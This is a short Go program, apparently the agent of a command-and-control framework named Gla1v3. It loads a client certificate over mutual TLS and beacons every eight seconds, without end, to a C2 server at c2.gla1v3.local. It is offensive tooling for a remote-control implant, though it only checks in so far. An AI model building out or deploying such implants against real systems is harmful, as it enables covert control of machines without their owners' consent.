package main

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

func main() {
	// 1. Load embedded client cert + key
	cert, err := tls.LoadX509KeyPair("../certs/agent.crt", "../certs/agent.key")
	if err != nil {
		log.Fatal("Failed to load agent cert/key:", err)
	}

	// 2. Load CA so we trust the server
	caCert, err := os.ReadFile("../certs/ca.crt")
	if err != nil {
		log.Fatal("Failed to read CA cert:", err)
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	// 3. mTLS config
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   "c2.gla1v3.local",
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
		Timeout:   10 * time.Second,
	}

	// 4. Beacon forever
	agentID := "agent-" + fmt.Sprintf("%d", time.Now().UnixNano())
	for {
		req, _ := http.NewRequest("GET", "https://c2.gla1v3.local:4443/beacon", nil)
		req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
		req.Header.Set("X-Agent-ID", agentID)

		resp, err := client.Do(req)
		if err != nil {
			log.Printf("Beacon failed: %v", err)
		} else {
			log.Printf("Beacon OK -> %s | Agent-ID: %s", resp.Status, agentID)
			resp.Body.Close()
		}
		time.Sleep(8 * time.Second)
	}
}
